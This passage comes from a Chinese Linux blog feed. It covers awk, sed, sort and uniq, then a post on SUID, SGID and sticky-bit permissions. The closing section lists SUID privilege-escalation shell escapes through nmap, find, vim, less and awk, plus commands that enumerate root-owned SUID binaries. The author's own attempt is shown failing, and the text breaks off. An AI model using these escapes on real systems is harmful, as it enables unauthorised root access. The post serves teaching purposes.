awk"><span class="hljs-keyword">for</span>(变量初始值;结束条件;操作符)<br>&#123;<br>action<br>&#125;<br><br><span class="hljs-keyword">for</span>(变量 <span class="hljs-keyword">in</span> 数组)<br>&#123;<br>action<br>&#125;<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123;sum=<span class="hljs-number">0</span>;<span class="hljs-keyword">for</span>(c=<span class="hljs-number">2</span>;c&lt;NF;c++)  sum+=<span class="hljs-variable">$c</span>;average[<span class="hljs-variable">$1</span>]=sum/(NF-<span class="hljs-number">1</span>)&#125; <span class="hljs-keyword">END</span>&#123;<span class="hljs-keyword">for</span>(user <span class="hljs-keyword">in</span> average) print user,average[user]&#125;<br><span class="hljs-keyword">BEGIN</span>&#123; last=<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span> &#125;  &#123;<span class="hljs-keyword">if</span> (last!= <span class="hljs-variable">$1</span>) print(<span class="hljs-variable">$1</span>); last=<span class="hljs-variable">$1</span>;&#125;<br></code></pre></td></tr></table></figure><h3 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h3><p>length：awk -F: ‘length($1) &gt;6 {print $1}’ &#x2F;etc&#x2F;passwd 统计长度<br>split： 将一段字符串分割符号，对文本进行分割，存放到数组里，使用for循环遍历读取数组里的内容<br>substr： awk -F: ‘{if (length($1)&gt;6) print substr($1,1,6)}’ &#x2F;etc&#x2F;passwd<br>substr($1,1,6) 类似于切片操作 对$1 第一个开始 切6个<br>system： 将linux命令放在awk里面</p><h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><p>详见：<a href="https://chujian521.github.io/blog/2019/03/19/zsh%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Agrep%E7%9A%84%E4%BD%BF%E7%94%A8/#grep%E7%9A%84%E4%BD%BF%E7%94%A8">grep的使用</a></p><h2 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>sed是一种流编辑器，它一次处理一行内容。处理时，把它处理的行存储在临时缓冲区中，称为”模式空间“，接着用sed命令处理缓冲区间中的内容，处理完后，把缓冲区中的内容送往屏幕。接着处理下一行，这样不断重复直到文件末尾。</p><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p>sed [OPTION]… {script-only-if-no-other-script} [input-file]…</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">-n, <span class="hljs-comment">--quiet, --silent</span><br>               suppress automatic printing <span class="hljs-keyword">of</span> pattern <span class="hljs-literal">space</span><br>-e script, <span class="hljs-comment">--expression=script</span><br>               <span class="hljs-built_in">add</span> <span class="hljs-keyword">the</span> script <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> commands <span class="hljs-built_in">to</span> be executed<br>-f script-<span class="hljs-built_in">file</span>, <span class="hljs-comment">--file=script-file</span><br>               <span class="hljs-built_in">add</span> <span class="hljs-keyword">the</span> contents <span class="hljs-keyword">of</span> script-<span class="hljs-built_in">file</span> <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> commands <span class="hljs-built_in">to</span> be executed<br><span class="hljs-comment">--follow-symlinks</span><br>               follow symlinks when processing <span class="hljs-keyword">in</span> place<br>-i[SUFFIX], <span class="hljs-comment">--in-place[=SUFFIX]</span><br>-E, -r, <span class="hljs-comment">--regexp-extended</span><br>               use extended regular expressions <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> script<br>               (<span class="hljs-keyword">for</span> portability use POSIX -E).<br></code></pre></td></tr></table></figure><ul><li>-n 表示安静模式，不输出不匹配的行</li><li>-r 识别扩展正则</li><li>-i 直接对原文件进行编辑</li><li>-e 识别多个命令操作</li></ul><h4 id="sed-s替换文本"><a href="#sed-s替换文本" class="headerlink" title="sed s替换文本"></a>sed s替换文本</h4><p>脚本部分格式：[address]s&#x2F;pattern&#x2F;replacement&#x2F;flags</p><table><thead><tr><th>flags 标记</th><th>功能</th></tr></thead><tbody><tr><td>n</td><td>1~512 之间的数字，表示指定要替换的字符串出现第几次时才进行替换，例如，一行中有 3 个 A，但用户只想替换第二个 A，这是就用到这个标记；</td></tr><tr><td>g</td><td>对数据中所有匹配到的内容进行替换，如果没有 g，则只会在第一次匹配成功时做替换操作。例如，一行数据中有 3 个 A，则只会替换第一个 A；</td></tr><tr><td>p</td><td>会打印与替换命令中指定的模式匹配的行。此标记通常与 -n 选项一起使用。</td></tr><tr><td>w file</td><td>将缓冲区中的内容写到指定的 file 文件中；</td></tr><tr><td>&amp;</td><td>用正则表达式匹配的内容进行替换；</td></tr><tr><td>\n</td><td>匹配第 n 个子串，该子串之前在 pattern 中用 () 指定。</td></tr><tr><td>\</td><td>转义（转义替换部分包含：&amp;、\ 等）。</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">xin@LAPTOP-MRV29Q6U:/mnt/c/Users/YIPING/Desktop$ <span class="hljs-built_in">cat</span> 10.txt<br>Line 1 192.168.1.1<br>Line 2 192.168.1.15<br>Line 3 192.168.1.14<br>Line 4 192.168.1.17<br>Line 5 192.168.1.13<br>Line 6 192.168.1.1<br>Line 7 192.168.1.12<br>Line 8 192.168.1.11<br>Line 9 192.168.1.1<br>Line 10 192.168.1.18xin@LAPTOP-MRV29Q6U:/mnt/c/Users/YIPING/Desktop$ sed <span class="hljs-string">&#x27;s/Line/line/&#x27;</span> 10.txt<br>line 1 192.168.1.1<br>line 2 192.168.1.15<br>line 3 192.168.1.14<br>line 4 192.168.1.17<br>line 5 192.168.1.13<br>line 6 192.168.1.1<br>line 7 192.168.1.12<br>line 8 192.168.1.11<br>line 9 192.168.1.1<br>line 10 192.168.1.18<br></code></pre></td></tr></table></figure><h4 id="sed-d-删除某行文本"><a href="#sed-d-删除某行文本" class="headerlink" title="sed d 删除某行文本"></a>sed d 删除某行文本</h4><p>脚本基本格式：[address]d</p><p>删除1到2行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">xin@LAPTOP-MRV29Q6U:/mnt/c/Users/YIPING/Desktop$ <span class="hljs-built_in">cat</span> 10.txt<br>Line 1 192.168.1.1<br>Line 2 192.168.1.15<br>Line 3 192.168.1.14<br>Line 4 192.168.1.17<br>Line 5 192.168.1.13<br>Line 6 192.168.1.1<br>Line 7 192.168.1.12<br>Line 8 192.168.1.11<br>Line 9 192.168.1.1<br>Line 10 192.168.1.18<br>xin@LAPTOP-MRV29Q6U:/mnt/c/Users/YIPING/Desktop$ sed <span class="hljs-string">&#x27;1,2d&#x27;</span> 10.txt <br>Line 3 192.168.1.14<br>Line 4 192.168.1.17<br>Line 5 192.168.1.13<br>Line 6 192.168.1.1<br>Line 7 192.168.1.12<br>Line 8 192.168.1.11<br>Line 9 192.168.1.1<br>Line 10 192.168.1.18<br></code></pre></td></tr></table></figure><h4 id="sed-a-i-插入"><a href="#sed-a-i-插入" class="headerlink" title="sed a(i)插入"></a>sed a(i)插入</h4><p>a 命令表示在指定行的后面附加一行，i 命令表示在指定行的前面插入一行</p><p>脚本基本格式：[address]a（或 i）\新文本内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">xin@LAPTOP-MRV29Q6U:/mnt/c/Users/YIPING/Desktop$ sed <span class="hljs-string">&#x27;1a\Line 1.1 11111&#x27;</span> 10.txt<br>Line 1 192.168.1.1<br>Line 1.1 11111<br>Line 2 192.168.1.15<br>Line 3 192.168.1.14<br>Line 4 192.168.1.17<br>Line 5 192.168.1.13<br>Line 6 192.168.1.1<br>Line 7 192.168.1.12<br>Line 8 192.168.1.11<br>Line 9 192.168.1.1<br>Line 10 192.168.1.18<br></code></pre></td></tr></table></figure><h4 id="sed-c替换"><a href="#sed-c替换" class="headerlink" title="sed c替换"></a>sed c替换</h4><p>脚本基本格式：[address]c\用于替换的新文本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">xin@LAPTOP-MRV29Q6U:/mnt/c/Users/YIPING/Desktop$ sed <span class="hljs-string">&#x27;1c\Line 1.1 11111&#x27;</span> 10.txt<br>Line 1.1 11111<br>Line 2 192.168.1.15<br>Line 3 192.168.1.14<br>Line 4 192.168.1.17<br>Line 5 192.168.1.13<br>Line 6 192.168.1.1<br>Line 7 192.168.1.12<br>Line 8 192.168.1.11<br>Line 9 192.168.1.1<br>Line 10 192.168.1.18<br></code></pre></td></tr></table></figure><h4 id="sed-y转换"><a href="#sed-y转换" class="headerlink" title="sed y转换"></a>sed y转换</h4><p>基本格式：[address]y&#x2F;inchars&#x2F;outchars&#x2F;</p><p>转换命令会对 inchars 和 outchars 值进行一对一的映射，即 inchars 中的第一个字符会被转换为 outchars 中的第一个字符，第二个字符会被转换成 outchars 中的第二个字符…这个映射过程会一直持续到处理完指定字符。如果 inchars 和 outchars 的长度不同，则 sed 会产生一条错误消息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">xin@LAPTOP-MRV29Q6U:/mnt/c/Users/YIPING/Desktop$ sed <span class="hljs-string">&#x27;y/123/079/&#x27;</span> 10.txt<br>Line 0 097.068.0.0<br>Line 7 097.068.0.05<br>Line 9 097.068.0.04<br>Line 4 097.068.0.07<br>Line 5 097.068.0.09<br>Line 6 097.068.0.0<br>Line 7 097.068.0.07<br>Line 8 097.068.0.00<br>Line 9 097.068.0.0<br>Line 00 097.068.0.08<br></code></pre></td></tr></table></figure><h4 id="sed-w-脚本命令"><a href="#sed-w-脚本命令" class="headerlink" title="sed w 脚本命令"></a>sed w 脚本命令</h4><p>w 命令用来将文本中指定行的内容写入文件中，此命令的基本格式如下：</p><p>[address]w filename</p><h4 id="sed-r-脚本命令"><a href="#sed-r-脚本命令" class="headerlink" title="sed r 脚本命令"></a>sed r 脚本命令</h4><p>r 命令用于将一个独立文件的数据插入到当前数据流的指定位置，该命令的基本格式为：</p><p>[address]r filename</p><h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>将文件进行排序，并将结果标准输出</p><h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3><p>sort [OPTION]… [FILE]…</p><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-n</td><td>依照数值大小排序</td></tr><tr><td>-r</td><td>以相反的顺序来排序</td></tr><tr><td>-t</td><td>设置排序时所用的分隔字符</td></tr><tr><td>-k</td><td>指定需要排序的列</td></tr></tbody></table><h2 id="uniq"><a href="#uniq" class="headerlink" title="uniq"></a>uniq</h2><h3 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h3><p>Linux uniq 命令用于检查及删除文本文件中重复出现的行列，一般与 sort 命令结合使用。</p><p>uniq 可检查文本文件中重复出现的行列。</p><h3 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uniq</span> [-cdui][-f&lt;栏位&gt;][-s&lt;字符位置&gt;][-w&lt;字符位置&gt;][--<span class="hljs-built_in">help</span>][--version][输入文件][输出文件]<br></code></pre></td></tr></table></figure><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-c</td><td>或–count ,在每列旁边显示该行重复出现的次数。</td></tr><tr><td>-d</td><td>或–repeated ，仅显示重复出现的行列。</td></tr><tr><td>-u</td><td>或–unique，仅显示出一次的行列。</td></tr><tr><td>-i</td><td>比较时忽略大小写</td></tr></tbody></table><p>需要注意的是，当重复的行并不相邻时，uniq 命令是不起作用的，因此该命令一般配合sort使用。</p><p>比如统计各行在文件中出现的次数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sort</span> 10.txt | <span class="hljs-built_in">uniq</span> -c<br>      2 Line 1 192.168.1.1<br>      1 Line 10 192.168.1.18<br>      1 Line 2 192.168.1.15<br>      1 Line 3 192.168.1.14<br>      1 Line 4 192.168.1.17<br>      1 Line 5 192.168.1.13<br>      1 Line 7 192.168.1.12<br>      1 Line 8 192.168.1.11<br>      1 Line 9 192.168.1.1<br></code></pre></td></tr></table></figure><p>找出重复行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sort</span> 10.txt | <span class="hljs-built_in">uniq</span> -d<br>      Line 1 192.168.1.1<br></code></pre></td></tr></table></figure><h2 id="tr、col等"><a href="#tr、col等" class="headerlink" title="tr、col等"></a>tr、col等</h2><p>详见<a href="https://chujian521.github.io/blog/2020/09/03/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/#%E6%96%87%E6%A1%A3%E7%BC%96%E8%BE%91">Linux常用命令学习–文档编辑</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux中的SUID、SGID、SBIT权限介绍</title>
    <link href="/blog/2022/11/19/Linux%E4%B8%AD%E7%9A%84SUID%E3%80%81SGID%E3%80%81SBIT%E6%9D%83%E9%99%90%E4%BB%8B%E7%BB%8D/"/>
    <url>/blog/2022/11/19/Linux%E4%B8%AD%E7%9A%84SUID%E3%80%81SGID%E3%80%81SBIT%E6%9D%83%E9%99%90%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<p><strong>在使用Linux服务器时，偶然发现有些可执行文件有一些除了rwx权限之外的权限s，之前了解过有一些特殊的文件权限，是使用chattr设置，lsattr查看的一些特殊文件属性（详见<a href="https://chujian521.github.io/blog/2020/09/03/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86-1">文件管理</a>），但是这种s权限不在隐藏属性中，于是好奇心驱使下特地研究一下。</strong></p><p><img src="/images/fj60.jpg"></p><span id="more"></span><h2 id="SUID权限"><a href="#SUID权限" class="headerlink" title="SUID权限"></a>SUID权限</h2><h3 id="什么是SUID权限"><a href="#什么是SUID权限" class="headerlink" title="什么是SUID权限"></a>什么是SUID权限</h3><p>SUID (Set UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义。</p><p>在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。通俗的来讲，假设我们现在有一个可执行文件<code>ls</code>，其属主为root,当我们通过非root用户登录时，如果<code>ls</code>设置了SUID权限,我们可在非root用户下运行该二进制可执行文件，在执行文件时，该进程的权限将为root权限。</p><h3 id="使用SUID权限的实例"><a href="#使用SUID权限的实例" class="headerlink" title="使用SUID权限的实例"></a>使用SUID权限的实例</h3><p>比如su命令和passwd命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@iZf8zdt0lxjb33kqwiaft8Z:/bin$ <span class="hljs-built_in">ls</span> -l su<br>-rwsr-xr-x 1 root root 44664 Mar 14  2022 su<br>x@iZf8zdt0lxjb33kqwiaft8Z:/bin$ <span class="hljs-built_in">ls</span> -l /usr/bin/passwd<br>-rwsr-xr-x 1 root root 59640 Mar 14  2022 /usr/bin/passwd<br></code></pre></td></tr></table></figure><p>实际上这2个可执行文件的所有者是root，但是我们依然可以在普通账号下使用这两个命令，这是因为普通账号在使用这2个命令的时候会暂时获得其拥有者的权限。</p><h3 id="如何设置SUID权限"><a href="#如何设置SUID权限" class="headerlink" title="如何设置SUID权限"></a>如何设置SUID权限</h3><p>使用<code>chmod u+s 可执行文件</code>设置可执行文件的SUID权限，对于不可执行文件设置SUID权限是无效的，相应的位置上列出属性后是S，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@iZf8zdt0lxjb33kqwiaft8Z:~$ <span class="hljs-built_in">chmod</span> u+s run <br>x@iZf8zdt0lxjb33kqwiaft8Z:~$ ll<br>-rwSrw-r-- 1 x    x       0 Nov 19 21:35 run<br>x@iZf8zdt0lxjb33kqwiaft8Z:~$ <span class="hljs-built_in">chmod</span> +x run <br>x@iZf8zdt0lxjb33kqwiaft8Z:~$ ll<br>-rwsrwxr-x 1 x    x       0 Nov 19 21:35 run*<br></code></pre></td></tr></table></figure><p>也可以使用数字表示：SUID&#x3D;4，SGID&#x3D;2，SBIT&#x3D;1，将原来的三位数扩展为四位数即可，把它们放在权限数字的最开头。只设置SUID可以用<code>chmod 4664 run</code></p><h2 id="SGID权限"><a href="#SGID权限" class="headerlink" title="SGID权限"></a>SGID权限</h2><h3 id="什么是SGID权限"><a href="#什么是SGID权限" class="headerlink" title="什么是SGID权限"></a>什么是SGID权限</h3><p>当s出现在文件的所属组x权限位置上时，表示所属组有SGID的权限。它有如下特点：</p><ol><li>既可以作用于目录，也可以作用于可执行文件</li><li>只要父目录有SGID权限，所有的子目录都会递归继承</li><li>执行者对于该可执行文件需要具有x权限</li><li>在执行过程中，调用者会暂时获得该文件的所属组权限</li></ol><h3 id="如何设置SGID权限"><a href="#如何设置SGID权限" class="headerlink" title="如何设置SGID权限"></a>如何设置SGID权限</h3><p>与SUID的设置类似，但是SGID可以设置目录和可执行文件，使用<code>chmod g+s 可执行文件or目录</code>即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@iZf8zdt0lxjb33kqwiaft8Z:~$ <span class="hljs-built_in">chmod</span> g+s run <br>x@iZf8zdt0lxjb33kqwiaft8Z:~$ ll<br>-rwsrwsr-x 1 x    x       0 Nov 19 21:35 run*<br></code></pre></td></tr></table></figure><p>也可以使用上述介绍SUID时的数字标识设置。</p><h2 id="SBIT权限"><a href="#SBIT权限" class="headerlink" title="SBIT权限"></a>SBIT权限</h2><h3 id="什么是SBIT权限"><a href="#什么是SBIT权限" class="headerlink" title="什么是SBIT权限"></a>什么是SBIT权限</h3><p>当t出现在其他组的x权限位置时，表示其他组具有SBIT的权限。</p><p>SBIT（Sticky Bit）目前只针对目录有效，对于目录的作用是：当用户在该目录下建立文件或目录时，仅有自己与 root才有权力删除。</p><h3 id="使用SBIT权限的实例"><a href="#使用SBIT权限的实例" class="headerlink" title="使用SBIT权限的实例"></a>使用SBIT权限的实例</h3><p>比如&#x2F;tmp目录，任何人都可以在&#x2F;tmp内增加、修改文件（因为权限全是rwx），但仅有该文件&#x2F;目录建立者与 root能够删除自己的目录或文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@iZf8zdt0lxjb33kqwiaft8Z:~$ <span class="hljs-built_in">cd</span> /<br>x@iZf8zdt0lxjb33kqwiaft8Z:/$ ll <br>drwxrwxrwt  10 root root  4096 Nov 19 21:58 tmp/<br></code></pre></td></tr></table></figure><h3 id="如何设置SBIT权限"><a href="#如何设置SBIT权限" class="headerlink" title="如何设置SBIT权限"></a>如何设置SBIT权限</h3><p>SBIT权限只能设置到目录，使用<code>chmod o+t 目录</code>，或者使用数字标识设置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@iZf8zdt0lxjb33kqwiaft8Z:~$ <span class="hljs-built_in">mkdir</span> tmp<br>x@iZf8zdt0lxjb33kqwiaft8Z:~$ ll<br>drwxrwxr-x 2 x    x    4096 Nov 19 22:34 tmp/<br>x@iZf8zdt0lxjb33kqwiaft8Z:~$ <span class="hljs-built_in">chmod</span> 1777 tmp/<br>x@iZf8zdt0lxjb33kqwiaft8Z:~$ ll<br>total 24<br>drwxrwxrwt 2 x    x    4096 Nov 19 22:34 tmp/<br></code></pre></td></tr></table></figure><p>权限t也有大小写之分，大写说明没有x权限，小写说明有x权限。</p><h2 id="利用SUID提权（新版Linux做了防护）"><a href="#利用SUID提权（新版Linux做了防护）" class="headerlink" title="利用SUID提权（新版Linux做了防护）"></a>利用SUID提权（新版Linux做了防护）</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>通过前面的SUID权限的介绍可以知道，在执行属于root的拥有suid权限的可执行文件时，我们执行的可执行文件会拥有root权限，因此我们可以利用这一点，利用具有suid权限用户的命令去执行我们想要执行的命令。</p><h3 id="可执行命令的一些命令"><a href="#可执行命令的一些命令" class="headerlink" title="可执行命令的一些命令"></a>可执行命令的一些命令</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p>适用版本：2.02-5.21</p><p>在早期nmap版本中，带有交互模式，因而允许用户执行shell命令，可以使用如下命令进入交互模式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --interactive<br>nmap&gt; !sh<br></code></pre></td></tr></table></figure><p>–interactive应该是比较老版本的nmap提供的选项，最近的nmap上都没有这个选项了，不过可以写一个nse脚本，内容为<code>os.execute(&#39;/bin/sh&#39;)</code>，然后<code>nmap --script=shell.nse</code>来提权</p><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>find用来在系统中查找文件，比较常用，有执行命令的能力。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">find anyExistFile -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \;<br><span class="hljs-comment">#进入shell</span><br>find anyExistFile -<span class="hljs-built_in">exec</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span> \;<br>$<br></code></pre></td></tr></table></figure><h4 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h4><p>vim的主要用途是做编辑器,是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。</p><p>通过vim进入shell：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">vim<br><span class="hljs-comment">#vim命令</span><br>:<span class="hljs-built_in">set</span> <span class="hljs-built_in">shell</span> = <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br>:<span class="hljs-built_in">shell</span><br></code></pre></td></tr></table></figure><h4 id="less-amp-more"><a href="#less-amp-more" class="headerlink" title="less&amp;more"></a>less&amp;more</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在less或者more中输入:</span><br>!/bin/sh<br></code></pre></td></tr></table></figure><p>即可进入shell</p><h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><p>awk是一种强大的文本处理工具，它也可以进入shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="提权实例（失败）"><a href="#提权实例（失败）" class="headerlink" title="提权实例（失败）"></a>提权实例（失败）</h3><h4 id="寻找可利用的具有SUID权限的的文件"><a href="#寻找可利用的具有SUID权限的的文件" class="headerlink" title="寻找可利用的具有SUID权限的的文件"></a>寻找可利用的具有SUID权限的的文件</h4><p>以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从&#x2F;目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到&#x2F;dev&#x2F;null，从而仅列出该用户具有访问权限的那些二进制文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -ldb &#123;&#125; ;<br></code></pre></td></tr></table></figure><p>例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@iZf8zdt0lxjb33kqwiaft8Z:~$ find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>/usr/bin/passwd<br>/usr/bin/gpasswd<br>/usr/bin/newgrp<br>/usr/bin/sudo<br>/usr/bin/chfn<br>/usr/bin/staprun<br>/usr/bin/find<br>/usr/bin/chsh<br>/usr/bin/traceroute6.iputils<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/bin/umount<br>/bin/su<br>/bin/mount<br>/bin/ping<br>/bin/fusermount<br></code></pre></td></tr></table></figure><p>我们发现find具有SUID权限，因此后面可以进行利用（这里是特地设置的例子）。</p><h4 id="利用find进入shell"><a href="#利用find进入shell" class="headerlink" title="利用find进入shell"></a>利用find进入shell</h4><p>亲测Ubuntu18.04不可以，进入shell之后权限还是原始的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">x@iZf8zdt0lxjb33kqwiaft8Z:/home/root$ <span class="hljs-built_in">cd</span> /tmp/<br>x@iZf8zdt0lxjb33kqwiaft8Z:/tmp$ <span class="hljs-built_in">touch</span> 111<br>x@iZf8zdt0lxjb33kqwiaft8Z:/tmp$ find 111 -<span class="hljs-built_in">exec</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span> \;<br>$ <span class="hljs-built_in">id</span><br>uid=1000(x) gid=1000(x) <span class="hljs-built_in">groups</span>=1000(x)<br></code></pre></td></tr></table></figure><p>查询资料得知如果启动bash时的Effective UID与Real 